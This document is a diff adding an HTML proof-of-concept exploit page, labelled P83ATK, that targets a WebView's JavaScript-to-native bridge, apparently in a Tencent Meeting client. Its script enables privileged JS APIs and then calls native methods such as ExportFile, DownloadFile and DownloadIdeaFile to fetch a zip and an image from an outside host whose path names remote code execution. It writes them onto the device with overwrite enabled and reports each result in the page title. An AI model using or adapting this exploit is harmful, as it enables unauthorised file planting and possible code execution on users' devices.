@@ -1,0 +1,50 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P83ATK</title></head>
+<body>
+<script>
+document.title='P83ATK:'+location.host;
+window.__p=function(r){
+  try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+  document.title='P83ACB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,48);
+};
+function c(id,mod,m,p){
+  try{
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      callback:'window.__p',module:mod,method:m,param:p,callId:id
+    }));
+  }catch(e){
+    document.title='P83ATK-NOJS:'+location.host;
+  }
+}
+setTimeout(function(){
+  if(!window.JSCallJavaMgr){document.title='P83ATK-NOMGR:'+location.host;return}
+  document.title='P83ATK-HAS:'+location.host;
+  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
+  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
+  var jsList=['ExportFile','LoadUrl','DownloadFile','OpenNewPage','GetFileBase64','SavePic','SaveImageToPhotosAlbum','GetWebViewSharePath'];
+  var q=[
+    ['AH2','CommonPlugin','GetPerformance',{}],
+    ['C1','OpenApiPlugin','CheckJsApiConfig',{jsApiList:jsList}],
+    ['C2','OpenApiPlugin','SetOpenJsApiConfig',{jsApiList:jsList}],
+    ['C3','OpenApiPlugin','CheckJsApiConfig',{}],
+    ['E1','CommonPlugin','ExportFile',{url:zip,fileName:'p83.zip',contentType:'application/zip'}],
+    ['E2','CommonPlugin','ExportFile',{url:png,fileName:'p83.png',contentType:'image/png'}],
+    ['L1','CommonPlugin','LoadUrl',{url:'https://meeting.tencent.com/v2/webview/keep-app-alive'}],
+    ['S1','CommonPlugin','SavePic',{url:png}],
+    ['V0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{}],
+    ['V1','VirtualBackgroundWebPlugin','DownloadFile',{url:png,over_write:true}],
+    ['I2','IdeaWebViewPlugin','GetWebViewSharePath',{}],
+    ['I3','IdeaWebViewPlugin','DownloadIdeaFile',{url:zip,title:'p83',code:'p83'}]
+  ];
+  var i=0;
+  function n(){
+    if(i>=q.length){document.title='P83ATK-DONE:'+location.host;return}
+    var x=q[i++];
+    document.title='P83-RUN:'+x[0];
+    c(x[0],x[1],x[2],x[3]);
+    setTimeout(n, 3500);
+  }
+  n();
+}, 1200);
+</script>
+</body></html>
